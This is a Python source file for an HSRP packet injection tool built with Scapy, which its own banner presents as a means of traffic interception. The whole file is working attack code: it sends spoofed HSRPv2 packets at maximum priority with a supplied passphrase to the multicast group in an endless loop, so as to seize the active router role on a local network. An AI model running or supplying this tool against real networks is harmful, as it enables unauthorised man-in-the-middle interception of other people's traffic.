#!/usr/bin/env python3


from scapy.all import *
from scapy.layers.l2 import *
from scapy.layers.hsrp import *
import argparse



print (r"""
MMMMMMMMMMMМ МММММММММMM MMMMMMMMMMMМ MMMMMMMMMMMМ MMMMMMMMMMMМММ MММММММММММ 
M  MMMMM  MM M  mmmmm..M MM  mmmm,  M MM  mmmmm  M M  MMM  MMM  M M  mmmm.  M 
M         `M M.      `YM M'        .M M'        .M M  MMP  MMP  M M  MMMMM  M 
M  MMMMM  MM MMMMMMM.  M MM  MMMb. "M MM  MMMMMMMM M  MM'  MM' .M M  MMMMM  M 
M  MMMMM  MM M. .MMM'  M MM  MMMMM  M MM  MMMMMMMM M  `' . '' .MM M  MMMMM  M 
M  MMMMM  MM Mb.     .dM MM  MMMMM  M MM  MMMMMMMM M    .d  .dMMM M  MMMMM  M 
MMMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMMM MMMMMMMMMMMM MMMMMMMMMMMMMM MMMMMMMMMMM
    """)
print ("HSRP packet injection tool for traffic interception (For HSRPv2 version)")
print("\nAuthor: @necreas1ng, <necreas1ng@protonmail.com>\n")

HSRPMulticastAddr = "224.0.0.102"

def take_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", dest="interface", type=str, required=True, help="Select your network interface")
    parser.add_argument("--group", dest="group", type=int, required=True, help="Choose HSRP group ID value")
    parser.add_argument("--ip", dest="attackerip", type=str, required=True, help="Specify your IP address")
    parser.add_argument("--vip", dest="vip", type=str, required=True, help="Specify HSRP Virtual IP address")
    parser.add_argument("--auth", dest="auth", type=str, required=True, help="Enter the auth HSRP passphrase")

    args = parser.parse_args()

    return args




def inject(interface, group, attackerip, vip, auth):
    L2frame = Ether()
    L3packet = IP(src=args.attackerip, dst=HSRPMulticastAddr, ttl=1)
    UDP_layer = UDP(sport=1985, dport=1985)
    evil_hsrp = HSRP(group=args.group, priority=255, virtualIP=args.vip, auth=args.auth)
    crafted = L2frame / L3packet / UDP_layer / evil_hsrp
    print ("\n[+] We begin to intercept the role of the ACTIVE router...")
    sendp(crafted, iface=args.interface, inter=3, loop=1, verbose=1)

args = take_arguments()
inject(args.interface, args.group, args.attackerip, args.vip, args.auth)
